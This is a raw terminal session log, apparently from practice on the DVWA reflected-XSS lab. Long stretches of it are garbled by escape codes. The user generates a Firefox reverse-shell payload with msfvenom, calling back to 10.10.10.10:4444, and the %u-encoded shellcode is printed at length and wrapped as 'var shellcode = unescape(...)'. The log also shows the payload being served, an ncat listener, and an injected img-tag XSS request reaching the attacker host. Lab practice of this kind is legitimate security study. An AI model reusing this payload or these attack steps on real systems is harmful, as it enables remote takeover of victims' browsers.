020%u2020%u200a%u2020%u2[HM453%u6572%u6d61%u772e%u6972%u6574%u6f28%u7475%u7570%u2c74%u6f20%u7475%u7570%u2e74%u656c%u676e%u6874%u3b29%u200a%u2020%u2020%u2020%u2020[HM%u286e%u7265%u2c72%u6f20%u7475%u7570%u2974%u7b20%u200a%u2020%u2020%u2020%u2020%u2020%u2020%u6920%u2066%u2128%u7265%u2972%u6f20%u7475%u7[HM463%u6f69%u286e%u6164%u6174%u2029%u0a7b%u2020%u2020%u2020%u2020%u2020%u2020%u7572%u436e%u646d%u6428%u7461%u2c61%u6620%u6e75%u7463%u6f69[HM%u2020%u2020%u2020%u2020%u6f20%u446e%u7461%u4161%u6176%u6c69%u6261%u656c%u203a%u6572%u6461%u6e55%u6974%u546c%u6b6f%u6e65%u6628%u6e75%u7[HM36e%u6f74%u5270%u7165%u6575%u7473%u203a%u7566%u636e%u6974%u6e6f%u7228%u7165%u6575%u7473%u202c%u6f63%u746e%u7865%u2974%u7b20%u2c7d%u200a[34;1H[K:[K[K [KESCESC[K[[[K55[K~~[K[HM%u203a%u7566%u636e%u6974%u6e6f%u7228%u7165%u6575%u7473%u202c%u6f63%u746e%u7865%u2974%u7b20%u2c7d%u200a%u2020%u2020%u2020%u2020%u6f20%u5[HM020%u2020%u7620%u7261%u6c20%u7369%u6574%u656e%u2072%u203d%u0a7b%u2020%u2020%u2020%u2020%u2020%u6e6f%u7453%u7261%u5274%u7165%u6575%u7473[HM%u3b27%u200a%u2020%u2020%u2020%u2020%u7d20%u200a%u2020%u2020%u2020%u7d20%u0a3b%u2020%u2020%u2020%u3b7d%u200a%u2020%u0a20%u200a%u2020%u2[HM020%u2020%u2020%u2020%u2020%u2020%u6263%u6228%u6675%u6566%u2972%u0a3b%u2020%u2020%u2020%u2020%u2020%u2020%u7562%u6666%u7265%u3d20%u2720[HM%u2020%u2020%u207d%u6c65%u6573%u6920%u2066%u6228%u6675%u6566%u2e72%u6e69%u6564%u4f78%u2866%u5c22%u226e%u2029%u203e%u312d%u2029%u0a7b%u2[HM020%u2020%u2020%u2020%u2020%u2020%u6220%u6675%u6566%u2072%u203d%u2727%u0a3b%u2020%u2020%u2020%u2020%u2020%u2020%u0a7d%u2020%u2020%u2020[HM%u295d%u5b28%u735c%u535c%u2a5d%u5c29%u2f31%u2929%u7b20%u200a%u2020%u2020%u2020%u2020%u2020%u2020%u6320%u2862%u5b6d%u5d32%u3b29%u200a%u2[HM020%u2020%u2020%u2020%u2020%u6669%u2820%u206d%u203d%u7562%u6666%u7265%u6d2e%u7461%u6863%u2f28%u285e%u5b5c%u5b5c%u775c%u387b%u5c7d%u5c5d[HM%u2020%u6669%u2820%u7562%u6666%u7265%u6d2e%u7461%u6863%u2f28%u285e%u5b5c%u5b5c%u775c%u387b%u5c7d%u5c5d%u295d%u292f%u2029%u0a7b%u2020%u2[HM461%u6e49%u7570%u5374%u7274%u6165%u546d%u536f%u7274%u6e69%u2867%u7473%u6572%u6d61%u202c%u6f63%u6e75%u2974%u0a3b%u2020%u2020%u2020%u2020[HM%u6573%u2c74%u6320%u756f%u746e%u2029%u0a7b%u2020%u2020%u2020%u2020%u2020%u7562%u6666%u7265%u2b20%u203d%u654e%u5574%u6974%u2e6c%u6572%u6[HM220%u7465%u7275%u206e%u7566%u636e%u6974%u6e6f%u7228%u7165%u6575%u7473%u202c%u6f63%u746e%u7865%u2c74%u7320%u7274%u6165%u2c6d%u6f20%u6666[HM%u0a0a%u2020%u2020%u2020%u2020%u6176%u2072%u7562%u6666%u7265%u3d20%u2720%u2c27%u6d20%u3d20%u6e20%u6c75%u3b6c%u200a%u2020%u2020%u2020%u7[HM92e%u706d%u726f%u2874%u7222%u7365%u756f%u6372%u3a65%u2f2f%u7267%u2f65%u6f6d%u7564%u656c%u2f73%u654e%u5574%u6974%u2e6c%u736a%u226d%u3b29[HM%u6e65%u3d20%u6620%u6e75%u7463%u6f69%u286e%u6263%u2029%u0a7b%u2020%u2020%u2020%u2020%u6f43%u706d%u6e6f%u6e65%u7374%u752e%u6974%u736c%u6[HM020%u202c%u2c30%u7420%u7572%u2965%u0a3b%u200a%u2020%u2020%u2020%u0a20%u2020%u2020%u2020%u6176%u2072%u6572%u6461%u6e55%u6974%u546c%u6b6f[HM%u6d61%u7550%u706d%u3b29%u200a%u2020%u2020%u2020%u7020%u6d75%u2e70%u6e69%u7469%u6928%u536e%u7274%u6165%u2c6d%u2d20%u2c31%u2d20%u2c31%u3[HM461%u4965%u736e%u6174%u636e%u2865%u6f43%u706d%u6e6f%u6e65%u7374%u692e%u746e%u7265%u6166%u6563%u2e73%u736e%u4949%u706e%u7475%u7453%u6572[HM%u732d%u7274%u6165%u2d6d%u7570%u706d%u313b%u5d22%u200a%u2020%u2020%u2020%u2020%u2020%u2020%u2020%u2020%u2020%u2020%u2020%u632e%u6572%u7[HMf43%u706d%u6e6f%u6e65%u7374%u632e%u616c%u7373%u7365%u225b%u6d40%u7a6f%u6c69%u616c%u6f2e%u6772%u6e2f%u7465%u6f77%u6b72%u692f%u706e%u7475[HM%u6e65%u6e49%u7570%u5374%u7274%u6165%u286d%u2c30%u3020%u202c%u2930%u0a3b%u200a%u2020%u2020%u2020%u7620%u7261%u7020%u6d75%u2070%u203d%u6[HM165%u286d%u2c30%u3020%u202c%u2930%u0a3b%u2020%u2020%u2020%u2020%u6176%u2072%u6e69%u7453%u6572%u6d61%u3d20%u7320%u636f%u656b%u2e74%u706f[HM%u2020%u2020%u2020%u2020%u6176%u2072%u756f%u5374%u7274%u6165%u206d%u203d%u6f73%u6b63%u7465%u6f2e%u6570%u4f6e%u7475%u7570%u5374%u7274%u6[HMe74%u7263%u6165%u6574%u7254%u6e61%u7073%u726f%u2874%u756e%u6c6c%u202c%u2c30%u6820%u736f%u2c74%u7020%u726f%u2c74%u6e20%u6c75%u296c%u0a3b[HM%u7265%u6976%u6563%u3b29%u200a%u2020%u2020%u2020%u7620%u7261%u7320%u636f%u656b%u2074%u203d%u6f73%u6b63%u7465%u7254%u6e61%u7073%u726f%u2[HM976%u6563%u4328%u6d6f%u6f70%u656e%u746e%u2e73%u6e69%u6574%u6672%u6361%u7365%u6e2e%u4973%u6f53%u6b63%u7465%u7254%u6e61%u7073%u726f%u5374[HM%u313b%u5d22%u200a%u2020%u2020%u2020%u2020%u2020%u2020%u2020%u2020%u2020%u2020%u2020%u2020%u2020%u2020%u2020%u2e20%u6567%u5374%u7265%u6[HM022%u6f6d%u697a%u6c6c%u2e61%u726f%u2f67%u656e%u7774%u726f%u2f6b%u6f73%u6b63%u7465%u742d%u6172%u736e%u6f70%u7472%u732d%u7265%u6976%u6563[HM%u2020%u7620%u7261%u7320%u636f%u656b%u5474%u6172%u736e%u6f70%u7472%u3d20%u4320%u6d6f%u6f70%u656e%u746e%u2e73%u6c63%u7361%u6573%u5b73%u4[HM127%u2e30%u3031%u312e%u2e30%u3031%u3b27%u200a%u2020%u2020%u2020%u7620%u7261%u7020%u726f%u2074%u203d%u3434%u3434%u0a3b%u200a%u2020%u2020[HM%u2f65%u6f6d%u7564%u656c%u2f73%u654e%u5574%u6974%u2e6c%u736a%u226d%u3b29%u200a%u2020%u2020%u2020%u7620%u7261%u6820%u736f%u2074%u203d%u3[HM020%u2020%u2020%u2020%u6f43%u706d%u6e6f%u6e65%u7374%u752e%u6974%u736c%u692e%u706d%u726f%u2874%u7222%u7365%u756f%u6372%u3a65%u2f2f%u7267[HM%u200a%u2020%u2020%u2820%u7566%u636e%u6974%u6e6f%u2928%u0a7b%u2020%u2020%u2020%u2020%u6977%u646e%u776f%u3d20%u7420%u6968%u3b73%u0a0a%u2[34;1H[K:[K[K [KESCESC[K[[[K55[K~~[K[K:[K[K [KESCESC[K[[[K55[K~~[K[K:[K[K [KESCESC[K[[[K55[K~~[K[K:[K[K [KESCESC[K[[[K55[K~~[K[K:[K[K [KESCESC[K[[[K55[K~~[K[K:[K[K [KESCESC[K[[[K55[K~~[K[K:[K[K [KESCESC[K[[[K55[K~~[K[K:[K[K [KESCESC[K[[[K55[K~~[K[K:[K[K [KESCESC[K[[[K55[K~~[K[K:[K[K [KESCESC[K[[[K55[K~~[K[K:[K[K [KESCESC[K[[[K55[K~~[K[K:[K[K [KESCESC[K[[[K55[K~~[K[K:[K[K [KESCESC[K[[[K55[K~~[K[K:[K[K [KESCESC[K[[[K55[K~~[K[K:[K[K [KESCESC[K[[[K55[K~~[K[K:[K[K [KESCESC[K[[[K55[K~~[K[K:[K[K [KESCESC[K[[[K55[K~~[K[K:[K[K [KESCESC[K[[[K55[K~~[K[K:[K[K [KESCESC[K[[[K55[K~~[K[K:[K[K [KESCESC[K[[[K55[K~~[K[K:[K[K [KESCESC[K[[[K55[K~~[K[K:[K[K [KESCESC[K[[[K55[K~~[K[K:[K[K [KESCESC[K[[[K55[K~~[K[K:[K[K [KESCESC[K[[[K55[K~~[K[K:[K[K [KESCESC[K[[[K55[K~~[K[K:[K[K[?1l>[?1049l[23;0;0t]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/XSS_Reflected[01;31mdinesh@evil[00m: [[01;34mXSS_Reflected[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/XSS_Reflected[01;31mdinesh@evil[00m: [[01;34mXSS_Reflected[00m] $ nmap -[K[K[K[K[K[Knc -knvlp[K[K[K[K[K[K[K[K[Kphp -S localhost:8080
+PHP 7.3.15-3 Development Server started at Mon Aug 31 16:49:47 2020
+Listening on http://localhost:8080
+Document root is /home/dinesh/Documents/work/workspaces/git_temp_projs/dvwa/XSS_Reflected
+Press Ctrl-C to quit.
+[Mon Aug 31 17:00:40 2020] [33m[::1]:40864 [404]: / - No such file or directory[0m
+[Mon Aug 31 17:00:40 2020] [33m[::1]:40866 [404]: /favicon.ico - No such file or directory[0m
+[Mon Aug 31 17:02:07 2020] [32m[::1]:40876 [200]: /js_rsh2.js[0m
+[Mon Aug 31 17:02:07 2020] [33m[::1]:40878 [404]: /favicon.ico - No such file or directory[0m
+^C]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/XSS_Reflected[01;31mdinesh@evil[00m: [[01;34mXSS_Reflected[00m] $ ^C
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/XSS_Reflected[01;31mdinesh@evil[00m: [[01;34mXSS_Reflected[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/XSS_Reflected[01;31mdinesh@evil[00m: [[01;34mXSS_Reflected[00m] $ php -S localhost:8080[1P:8080[1P:8080[1P:8080[1P:8080[1P:8080[1P:8080[1P:8080[1P:8080[1P:80801:80800:8080.:80801:80800:8080.:80801:80800:80801:80800:8080[1P:8080[1P:8080.:80801:80800:8080
+PHP 7.3.15-3 Development Server started at Mon Aug 31 17:02:20 2020
+Listening on http://10.10.10.10:8080
+Document root is /home/dinesh/Documents/work/workspaces/git_temp_projs/dvwa/XSS_Reflected
+Press Ctrl-C to quit.
+[Mon Aug 31 17:02:26 2020] [32m10.10.10.10:39278 [200]: /js_rsh2.js[0m
+[Mon Aug 31 17:02:26 2020] [33m10.10.10.10:39280 [404]: /favicon.ico - No such file or directory[0m
+[Mon Aug 31 17:02:32 2020] [32m10.10.10.10:39282 [200]: /js_rsh2.js[0m
+[Mon Aug 31 17:02:43 2020] [32m10.10.10.10:39991 [200]: /js_rsh2.js[0m
+[Mon Aug 31 17:02:43 2020] [33m10.10.10.10:50871 [404]: /favicon.ico - No such file or directory[0m
+[Mon Aug 31 17:03:17 2020] [32m10.10.10.10:60769 [200]: /js_rsh2.js[0m
+^C]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/XSS_Reflected[01;31mdinesh@evil[00m: [[01;34mXSS_Reflected[00m] $ ^C
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/XSS_Reflected[01;31mdinesh@evil[00m: [[01;34mXSS_Reflected[00m] $ ^C
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/XSS_Reflected[01;31mdinesh@evil[00m: [[01;34mXSS_Reflected[00m] $ ^C
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/XSS_Reflected[01;31mdinesh@evil[00m: [[01;34mXSS_Reflected[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/XSS_Reflected[01;31mdinesh@evil[00m: [[01;34mXSS_Reflected[00m] $ ll
+total 612
+-rw-r--r-- 1 dinesh dinesh    184 Aug 31 15:20 01.session
+-rw-r--r-- 1 dinesh dinesh 196608 Aug 31 17:03 01.session.data
+-rw-r--r-- 1 dinesh dinesh     16 Aug 31 17:03 01.session.lck
+-rw-r--r-- 1 dinesh dinesh 331233 Aug 31 17:03 01.session.log
+-rw-r--r-- 1 dinesh dinesh    100 Aug 31 15:20 01.session.properties
+-rw-r--r-- 1 dinesh dinesh   6754 Aug 31 15:20 01.session.script
+drwxr-xr-x 2 dinesh dinesh   4096 Aug 31 15:20 [0m[01;34m01.session.tmp[0m
+-rw-r--r-- 1 dinesh dinesh  22158 Aug 31 16:48 js_rsh2.js
+-rw-r--r-- 1 dinesh dinesh  22158 Aug 31 17:01 js_rsh2.js.txt
+-rw-r--r-- 1 dinesh dinesh 155648 Aug 31 16:48 terminal_log_Mon_31_Aug_2020_04:25:37_PM_IST.dmp
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/XSS_Reflected[01;31mdinesh@evil[00m: [[01;34mXSS_Reflected[00m] $ rm js_rsh2.js*
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/XSS_Reflected[01;31mdinesh@evil[00m: [[01;34mXSS_Reflected[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/XSS_Reflected[01;31mdinesh@evil[00m: [[01;34mXSS_Reflected[00m] $ ll
+total 568
+-rw-r--r-- 1 dinesh dinesh    184 Aug 31 15:20 01.session
+-rw-r--r-- 1 dinesh dinesh 196608 Aug 31 17:03 01.session.data
+-rw-r--r-- 1 dinesh dinesh     16 Aug 31 17:03 01.session.lck
+-rw-r--r-- 1 dinesh dinesh 331233 Aug 31 17:03 01.session.log
+-rw-r--r-- 1 dinesh dinesh    100 Aug 31 15:20 01.session.properties
+-rw-r--r-- 1 dinesh dinesh   6754 Aug 31 15:20 01.session.script
+drwxr-xr-x 2 dinesh dinesh   4096 Aug 31 15:20 [0m[01;34m01.session.tmp[0m
+-rw-r--r-- 1 dinesh dinesh 159744 Aug 31 17:03 terminal_log_Mon_31_Aug_2020_04:25:37_PM_IST.dmp
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/XSS_Reflected[01;31mdinesh@evil[00m: [[01;34mXSS_Reflected[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/XSS_Reflected[01;31mdinesh@evil[00m: [[01;34mXSS_Reflected[00m] $ nc -klc[Kvnp 8080
+Ncat: Version 7.80 ( https://nmap.org/ncat )
+Ncat: Listening on :::8080
+Ncat: Listening on 0.0.0.0:8080
+Ncat: Connection from 10.10.10.10.
+Ncat: Connection from 10.10.10.10:48821.
+GET /a.txt HTTP/1.1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Referer: http://dvwa.local/vulnerabilities/xss_r/?name=as%3Cimg+src%3D%22http%3A%2F%2F10.10.10.10%3A8080%2Fa.txt%22+%2F%3E
+DNT: 1
+Connection: keep-alive
+Host: 10.10.10.10:8080
+
+^C
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/XSS_Reflected[01;31mdinesh@evil[00m: [[01;34mXSS_Reflected[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/XSS_Reflected[01;31mdinesh@evil[00m: [[01;34mXSS_Reflected[00m] $ nc -klvnp 8080ll[Krm js_rsh2.js*ll[Kphp -S 10.10.10.10:8080[2Plocalhost:8080[5Pless js_rsh2.js l[Kmsfvenom -p firefox/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444  --format js_le -o js_rsh2.js
+[-] No platform was selected, choosing Msf::Module::Platform::Firefox from the payload
+[-] No arch selected, selecting arch: firefox from the payload
+No encoder specified, outputting raw payload
+Payload size: 7380 bytes
+Final size of js_le file: 22140 bytes
+Saved as: js_rsh2.js
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/XSS_Reflected[01;31mdinesh@evil[00m: [[01;34mXSS_Reflected[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/XSS_Reflected[01;31mdinesh@evil[00m: [[01;34mXSS_Reflected[00m] $ less 
+01.session                                        01.session.script
+01.session.data                                   01.session.tmp/
+01.session.lck                                    js_rsh2.js
+01.session.log                                    terminal_log_Mon_31_Aug_2020_04:25:37_PM_IST.dmp
+01.session.properties                             
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/XSS_Reflected[01;31mdinesh@evil[00m: [[01;34mXSS_Reflected[00m] $ less js_rsh2.js 
+[?1049h[22;0;0t[?1h=%u200a%u2020%u2020%u2820%u7566%u636e%u6974%u6e6f%u2928%u0a7b%u2020%u2020%u2020%u2020%u6977%u646e%u776f%u3d20%u7420%u6968%u3b73%u0a0a%u2 020%u2020%u2020%u2020%u6f43%u706d%u6e6f%u6e65%u7374%u752e%u6974%u736c%u692e%u706d%u726f%u2874%u7222%u7365%u756f%u6372%u3a65%u2f2f%u7267 %u2f65%u6f6d%u7564%u656c%u2f73%u654e%u5574%u6974%u2e6c%u736a%u226d%u3b29%u200a%u2020%u2020%u2020%u7620%u7261%u6820%u736f%u2074%u203d%u3 127%u2e30%u3031%u312e%u2e30%u3031%u3b27%u200a%u2020%u2020%u2020%u7620%u7261%u7020%u726f%u2074%u203d%u3434%u3434%u0a3b%u200a%u2020%u2020 %u2020%u7620%u7261%u7320%u636f%u656b%u5474%u6172%u736e%u6f70%u7472%u3d20%u4320%u6d6f%u6f70%u656e%u746e%u2e73%u6c63%u7361%u6573%u5b73%u4 022%u6f6d%u697a%u6c6c%u2e61%u726f%u2f67%u656e%u7774%u726f%u2f6b%u6f73%u6b63%u7465%u742d%u6172%u736e%u6f70%u7472%u732d%u7265%u6976%u6563 %u313b%u5d22%u200a%u2020%u2020%u2020%u2020%u2020%u2020%u2020%u2020%u2020%u2020%u2020%u2020%u2020%u2020%u2020%u2e20%u6567%u5374%u7265%u6 976%u6563%u4328%u6d6f%u6f70%u656e%u746e%u2e73%u6e69%u6574%u6672%u6361%u7365%u6e2e%u4973%u6f53%u6b63%u7465%u7254%u6e61%u7073%u726f%u5374 %u7265%u6976%u6563%u3b29%u200a%u2020%u2020%u2020%u7620%u7261%u7320%u636f%u656b%u2074%u203d%u6f73%u6b63%u7465%u7254%u6e61%u7073%u726f%u2 e74%u7263%u6165%u6574%u7254%u6e61%u7073%u726f%u2874%u756e%u6c6c%u202c%u2c30%u6820%u736f%u2c74%u7020%u726f%u2c74%u6e20%u6c75%u296c%u0a3b %u2020%u2020%u2020%u2020%u6176%u2072%u756f%u5374%u7274%u6165%u206d%u203d%u6f73%u6b63%u7465%u6f2e%u6570%u4f6e%u7475%u7570%u5374%u7274%u6 165%u286d%u2c30%u3020%u202c%u2930%u0a3b%u2020%u2020%u2020%u2020%u6176%u2072%u6e69%u7453%u6572%u6d61%u3d20%u7320%u636f%u656b%u2e74%u706f %u6e65%u6e49%u7570%u5374%u7274%u6165%u286d%u2c30%u3020%u202c%u2930%u0a3b%u200a%u2020%u2020%u2020%u7620%u7261%u7020%u6d75%u2070%u203d%u6 f43%u706d%u6e6f%u6e65%u7374%u632e%u616c%u7373%u7365%u225b%u6d40%u7a6f%u6c69%u616c%u6f2e%u6772%u6e2f%u7465%u6f77%u6b72%u692f%u706e%u7475 %u732d%u7274%u6165%u2d6d%u7570%u706d%u313b%u5d22%u200a%u2020%u2020%u2020%u2020%u2020%u2020%u2020%u2020%u2020%u2020%u2020%u632e%u6572%u7 461%u4965%u736e%u6174%u636e%u2865%u6f43%u706d%u6e6f%u6e65%u7374%u692e%u746e%u7265%u6166%u6563%u2e73%u736e%u4949%u706e%u7475%u7453%u6572 %u6d61%u7550%u706d%u3b29%u200a%u2020%u2020%u2020%u7020%u6d75%u2e70%u6e69%u7469%u6928%u536e%u7274%u6165%u2c6d%u2d20%u2c31%u2d20%u2c31%u3 020%u202c%u2c30%u7420%u7572%u2965%u0a3b%u200a%u2020%u2020%u2020%u0a20%u2020%u2020%u2020%u6176%u2072%u6572%u6461%u6e55%u6974%u546c%u6b6f %u6e65%u3d20%u6620%u6e75%u7463%u6f69%u286e%u6263%u2029%u0a7b%u2020%u2020%u2020%u2020%u6f43%u706d%u6e6f%u6e65%u7374%u752e%u6974%u736c%u6 92e%u706d%u726f%u2874%u7222%u7365%u756f%u6372%u3a65%u2f2f%u7267%u2f65%u6f6d%u7564%u656c%u2f73%u654e%u5574%u6974%u2e6c%u736a%u226d%u3b29 %u0a0a%u2020%u2020%u2020%u2020%u6176%u2072%u7562%u6666%u7265%u3d20%u2720%u2c27%u6d20%u3d20%u6e20%u6c75%u3b6c%u200a%u2020%u2020%u2020%u7 220%u7465%u7275%u206e%u7566%u636e%u6974%u6e6f%u7228%u7165%u6575%u7473%u202c%u6f63%u746e%u7865%u2c74%u7320%u7274%u6165%u2c6d%u6f20%u6666 %u6573%u2c74%u6320%u756f%u746e%u2029%u0a7b%u2020%u2020%u2020%u2020%u2020%u7562%u6666%u7265%u2b20%u203d%u654e%u5574%u6974%u2e6c%u6572%u6 461%u6e49%u7570%u5374%u7274%u6165%u546d%u536f%u7274%u6e69%u2867%u7473%u6572%u6d61%u202c%u6f63%u6e75%u2974%u0a3b%u2020%u2020%u2020%u2020 %u2020%u6669%u2820%u7562%u6666%u7265%u6d2e%u7461%u6863%u2f28%u285e%u5b5c%u5b5c%u775c%u387b%u5c7d%u5c5d%u295d%u292f%u2029%u0a7b%u2020%u2 020%u2020%u2020%u2020%u2020%u6669%u2820%u206d%u203d%u7562%u6666%u7265%u6d2e%u7461%u6863%u2f28%u285e%u5b5c%u5b5c%u775c%u387b%u5c7d%u5c5d %u295d%u5b28%u735c%u535c%u2a5d%u5c29%u2f31%u2929%u7b20%u200a%u2020%u2020%u2020%u2020%u2020%u2020%u6320%u2862%u5b6d%u5d32%u3b29%u200a%u2 020%u2020%u2020%u2020%u2020%u2020%u6220%u6675%u6566%u2072%u203d%u2727%u0a3b%u2020%u2020%u2020%u2020%u2020%u2020%u0a7d%u2020%u2020%u2020 %u2020%u2020%u207d%u6c65%u6573%u6920%u2066%u6228%u6675%u6566%u2e72%u6e69%u6564%u4f78%u2866%u5c22%u226e%u2029%u203e%u312d%u2029%u0a7b%u2 020%u2020%u2020%u2020%u2020%u2020%u6263%u6228%u6675%u6566%u2972%u0a3b%u2020%u2020%u2020%u2020%u2020%u2020%u7562%u6666%u7265%u3d20%u2720 %u3b27%u200a%u2020%u2020%u2020%u2020%u7d20%u200a%u2020%u2020%u2020%u7d20%u0a3b%u2020%u2020%u2020%u3b7d%u200a%u2020%u0a20%u200a%u2020%u2 020%u2020%u7620%u7261%u6c20%u7369%u6574%u656e%u2072%u203d%u0a7b%u2020%u2020%u2020%u2020%u2020%u6e6f%u7453%u7261%u5274%u7165%u6575%u7473 %u203a%u7566%u636e%u6974%u6e6f%u7228%u7165%u6575%u7473%u202c%u6f63%u746e%u7865%u2974%u7b20%u2c7d%u200a%u2020%u2020%u2020%u2020%u6f20%u5 [7mjs_rsh2.js[27m[K[K[?1l>[?1049l[23;0;0t]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/XSS_Reflected[01;31mdinesh@evil[00m: [[01;34mXSS_Reflected[00m] $ less js_rsh2.js [Kcat js_rsh2.js [1P[1P[1P[1@v[1@i[1@m[C[1@ 
+[?1049h[22;0;0t[>4;2m[?1h=[?2004h[1;34r[?12h[?12l[22;2t[22;1t[27m[23m[29m[m[H[2J[?25l[34;1H"js_rsh2.js" [noeol] 1L, 22140C[2;1H▽[6n[2;1H  [1;1H[>c]10;?]11;?[1;1H[4m[38;5;130m  1 [m[4m%u200a%u2020%u2020%u2820%u7566%u636e%u6974%u6e6f%u2928%u0a7b%u2020%u2020%u2020%[m[1m[4m[31m[48;5;121mu[m[1m[4m[31m[48;5;84m2020%u6977%u646e%u776f%u3d20%u7420%u6968%u3b73%u0a0[m[2;1H[94m~                                                                                                                                      [3;1H~                                                                                                                                      [4;1H~                                                                                                                                      [5;1H~                                                                                                                                      [6;1H~                                                                                                                                      [7;1H~                                                                                                                                      [8;1H~                                                                                                                                      [9;1H~                                                                                                                                      [10;1H~                                                                                                                                      [11;1H~                                                                                                                                      [12;1H~                                                                                                                                      [13;1H~                                                                                                                                      [14;1H~                                                                                                                                      [15;1H~                                                                                                                                      [16;1H~                                                                                                                                      [17;1H~                                                                                                                                      [18;1H~                                                                                                                                      [19;1H~                                                                                                                                      [20;1H~                                                                                                                                      [21;1H~                                                                                                                                      [22;1H~                                                                                                                                      [23;1H~                                                                                                                                      [24;1H~                                                                                                                                      [25;1H~                                                                                                                                      [26;1H~                                                                                                                                      [27;1H~                                                                                                                                      [28;1H~                                                                                                                                      [29;1H~                                                                                                                                      [30;1H~                                                                                                                                      [31;1H~                                                                                                                                      [32;1H~                                                                                                                                      [33;1H~                                                                                                                                      [m[34;118H1,1[11CAll[1;5H[?25hP+q436f\P+q6b75\P+q6b64\P+q6b72\P+q6b6c\P+q2332\P+q2334\P+q2569\P+q2a37\P+q6b31\[27m[23m[29m[m[H[2J[?25l[1;1H[4m[93m  1 [m[4m%u200a%u2020%u2020%u2820%u7566%u636e%u6974%u6e6f%u2928%u0a7b%u2020%u2020%u2020%[m[1m[4m[31m[48;5;121mu[m[1m[4m[31m[48;5;84m2020%u6977%u646e%u776f%u3d20%u7420%u6968%u3b73%u0a0[m[2;1H[94m~                                                                                                                                      [3;1H~                                                                                                                                      [4;1H~                                                                                                                                      [5;1H~                                                                                                                                      [6;1H~                                                                                                                                      [7;1H~                                                                                                                                      [8;1H~                                                                                                                                      [9;1H~                                                                                                                                      [10;1H~                                                                                                                                      [11;1H~                                                                                                                                      [12;1H~                                                                                                                                      [13;1H~                                                                                                                                      [14;1H~                                                                                                                                      [15;1H~                                                                                                                                      [16;1H~                                                                                                                                      [17;1H~                                                                                                                                      [18;1H~                                                                                                                                      [19;1H~                                                                                                                                      [20;1H~                                                                                                                                      [21;1H~                                                                                                                                      [22;1H~                                                                                                                                      [23;1H~                                                                                                                                      [24;1H~                                                                                                                                      [25;1H~                                                                                                                                      [26;1H~                                                                                                                                      [27;1H~                                                                                                                                      [28;1H~                                                                                                                                      [29;1H~                                                                                                                                      [30;1H~                                                                                                                                      [31;1H~                                                                                                                                      [32;1H~                                                                                                                                      [33;1H~                                                                                                                                      [m[34;118H1,1[11CAll"js_rsh2.js" [noeol] 1L, 22140C[1;5H[?25h[?25l[?25h[?25l[34;1H[1m-- INSERT --[m[34;14H[K[34;118H1,1[11CAll[1;5H[?25h[?25l[4mi%u200a%u2020%u2020%u2820%u7566%u636e%u6974%u6e6f%u2928%u0a7b%u2020%u2020%u2020[m[1m[4m[31m[48;5;121m%[m[1m[4m[31m[48;5;84mu2020%u6977%u646e%u776f%u3d20%u7420%u6968%u3b73%u0a[m[34;120H2[1;6H[?25h[?25l[4m%u200a%u2020%u2020%u2820%u7566%u636e%u6974%u6e6f%u2928%u0a7b%u2020%u2020%u2020%[m[1m[4m[31m[48;5;121mu[m[1m[4m[31m[48;5;84m2020%u6977%u646e%u776f%u3d20%u7420%u6968%u3b73%u0a0[m[34;120H1[1;5H[?25h[?25l[1m[4m[96mvar[m[4m shellcode = [m[4m[93munescape[m[4m([m[4m[95m"%u200a%u2020%u2020%u2820%u7566%u636e%u6974%u6e6f%u292[m[1m[4m[31m[48;5;121m8[m[1m[4m[31m[48;5;84m%u0a7b%u2020%u2020%u2020%u2020%u6977%u646e%u776f%u3[m[34;120H27[1;31H[?25h[?25l[1;5H[1m[4m[31m[48;5;84mu202c%u756e%u6c6c%u3b29%u200a%u2020%u2020%u7d20%u2829%u3b29%u0a0a[m[4m                                                                  [m[34;118H[K[34;118H1,22167[7CAll[1;70H[?25h[?25l[1m[4m[31m[48;5;84m"[m[34;124H8[1;71H[?25h[?25l[1m[4m[31m[48;5;84m)[m[4m[46m)[m[4m [m[34;124H9[1;72H[?25h[?25l[34;124H8[1;71H[?25h[?25l[1m[4m[31m[48;5;84m)[m[34;124H7[1;70H[?25h[?25l[34;124H6[1;69H[?25h[?25l[34;124H5[1;68H[?25h[?25l[34;124H4[1;67H[?25h[?25l[34;124H3[1;66H[?25h[?25l[5C[4m[46m)[m[4m [m[34;124H9[1;72H[?25h[?25l[1;5H[1m[4m[96mvar[m[4m shellcode = [m[4m[93munescape[m[4m[46m([m[4m[95m"%u200a%u2020%u2020%u2820%u7566%u636e%u6974%u6e6f%u292[m[1m[4m[31m[48;5;121m8[m[1m[4m[31m[48;5;84m%u0a7b%u2020%u2020%u2020%u2020%u6977%u646e%u776f%u3[m[34;118H[K[34;118H1,1[11CAll[1;29H[4m([1;5H[?25h[m[34;1H[K[1;5H[?25l[34;118H1,1[11CAll[1;5H[?25h[?25l[34;118H[K[34;1H:[?2004h[?25hx[?25l[?2004l"js_rsh2.js" 1L, 22169C written[23;2t[23;1t
